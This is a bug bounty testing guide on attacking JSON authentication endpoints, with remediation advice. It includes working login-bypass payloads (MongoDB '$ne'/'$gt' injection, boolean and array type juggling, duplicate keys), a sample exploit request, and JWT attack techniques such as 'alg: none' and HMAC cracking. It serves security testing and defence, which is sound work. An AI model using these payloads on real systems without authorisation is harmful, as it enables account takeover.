# 📁 JSON Authentication Endpoints — Security Testing Guide

*Contributed by Cyber_Spy.404 | Educational Bug Bounty Series*

> **Scope and ethics:** Testing JSON authentication endpoints involves assessing database queries, token generation, and type handling. Test strictly on authorized assets. **Never perform destructive database injection, brute force real user credentials, or attempt to bypass authentication on accounts you do not own.**

---

## 📌 Executive Summary

Modern web applications and single-page applications (SPAs) overwhelmingly rely on **JSON-based REST and GraphQL authentication endpoints** (e.g. `POST /api/v1/auth/login` or `POST /auth/token`) rather than traditional HTML form-encoded POSTs.

While JSON enables structured serialization, it introduces specialized attack vectors such as **NoSQL injection via object payloads**, **type confusion**, **duplicate key parsing discrepancies**, and **JSON Web Token (JWT) handling flaws**.

```
+---------------------------------------------------------------------------------+
|                       JSON Authentication Attack Surface                        |
+---------------------------------------------------------------------------------+
        |                                |                                 |
        v                                v                                 v
  NoSQL Object Injection          Type Confusion & Juggling        Content-Type Confusion
  - {"$ne": "invalid"}            - "password": true               - Swap to XML (XXE)
  - {"$gt": ""}                   - "password": [1]                - Swap to text/plain (CSRF)
```

---

## 🔍 Core Vulnerability Vectors & Testing Methodology

### 1. NoSQL Injection via Object Payloads (MongoDB / CouchDB)
In Node.js / Express applications using MongoDB (Mongoose or native driver), developers often pass parsed JSON objects directly into database queries:
```javascript
// ❌ VULNERABLE: Direct object passed to MongoDB query
const user = await db.collection('users').findOne({
  username: req.body.username,
  password: req.body.password
});
```

#### Exploit Payload (Not Equal Operator `$ne`):
```json
{
  "username": "admin",
  "password": { "$ne": "wrong_password" }
}
```
*Mechanism:* MongoDB evaluates `password != "wrong_password"`. Because the real password does not equal the wrong password, the condition evaluates to `true`, logging the attacker into the admin account without knowing the password!

#### Greater Than Operator `$gt`:
```json
{
  "username": { "$gt": "" },
  "password": { "$gt": "" }
}
```
*Mechanism:* Matches the first user record in the database where username and password are not empty.

---

### 2. Type Confusion & Type Juggling
JSON supports distinct data types: Strings (`"text"`), Numbers (`123`), Booleans (`true`), Arrays (`[]`), and Objects (`{}`).
If a backend language (such as PHP loosely comparing with `==`, or weakly-typed JavaScript) fails to enforce strict string types:

#### Boolean Injection:
```json
{
  "username": "admin",
  "password": true
}
```
In PHP: `('MyPasswordHash' == true)` evaluates to `true`!

#### Array Injection:
```json
{
  "username": ["admin"],
  "password": ["dummy"]
}
```
*Test observation:* Does the server return a 500 error exposing database stack traces, or grant access?

---

### 3. Duplicate Key Collision
Different JSON parsers handle duplicate keys differently (taking the first occurrence, the last occurrence, or throwing an error):
```json
{
  "username": "victim@example.com",
  "username": "attacker@example.com",
  "password": "Password123!"
}
```
If an API Gateway validates the first key (confirming attacker has permission), but the backend application server evaluates the second key, access control can be bypassed.

---

### 4. Content-Type Switching & Parser Confusion
What happens when you send non-JSON content to the endpoint?
- **XML Switching (XXE):** Change `Content-Type: application/json` to `Content-Type: application/xml`. If the server automatically routes to an XML parser, test for XML External Entity (XXE) injection.
- **Form-Urlencoded Switching:** Change `Content-Type` to `application/x-www-form-urlencoded` to test whether CSRF defenses are active on alternative parsers.

---

### 5. JWT Token Generation & Validation Weaknesses
If the JSON authentication endpoint returns a JSON Web Token (JWT) upon successful login, analyze the token structure (`header.payload.signature`):
- **Algorithm None (`"alg": "none"`):** Test if the server accepts tokens with signature stripped and algorithm set to `none`.
- **Weak HMAC Secret:** Test if the symmetric signing secret can be brute-forced offline using wordlists (`rockyou.txt`) with hashcat or jwt-tool.
- **JWK / JKU Header Injection:** Check if the server allows client-specified public keys via the `jwk` or `jku` header parameters.

---

## 🛠️ Safe Educational Verification Template

### Safe HTTP NoSQL Injection Request
```http
POST /api/v1/auth/login HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "username": "controlled-admin-account",
  "password": { "$ne": "invalid_test_password" }
}
```

### Vulnerable Response Body
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "authenticated",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": 1,
    "username": "controlled-admin-account"
  }
}
```

---

## 🛡️ Mitigation & Remediation Guidelines

### 1. Enforce Strict Schema Validation & Type Checking
Always enforce that incoming `username` and `password` parameters are strictly non-empty strings before querying the database:
```javascript
// ✅ SECURE with Zod in Express
import { z } from 'zod';

const LoginSchema = z.object({
  username: z.string().min(1).max(100),
  password: z.string().min(1).max(128)
});

app.post('/api/login', async (req, res) => {
  const parseResult = LoginSchema.safeParse(req.body);
  if (!parseResult.success) {
    return res.status(400).json({ error: "Invalid input types." });
  }
  // Proceed with verified string values
});
```

### 2. Sanitize MongoDB Object Operators
In Node.js, use packages like `express-mongo-sanitize` to strip all `$` and `.` characters from incoming request bodies:
```javascript
import mongoSanitize from 'express-mongo-sanitize';
app.use(mongoSanitize());
```

### 3. Strict Content-Type Enforcement
Reject any incoming request that does not strictly match `Content-Type: application/json` with HTTP status `415 Unsupported Media Type`.

---

## 📊 CVSS 3.1 Severity Reference

- **NoSQL Injection leading to Complete Authentication Bypass:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (Score: **9.8 - Critical**)
- **Type Juggling Auth Bypass (PHP loose comparison):** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (Score: **9.8 - Critical**)
- **Information Disclosure via Malformed JSON 500 Error:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (Score: **5.3 - Medium**)

---

## ✅ Bug Bounty Triage Checklist

- [ ] Target endpoint is confirmed in scope.
- [ ] Tested strictly against your own test accounts.
- [ ] Tested NoSQL operators (`$ne`, `$gt`).
- [ ] Tested type variations (booleans, arrays, integers).
- [ ] Verified Content-Type switching behavior.
- [ ] Redacted all test passwords and JWT tokens in the report.
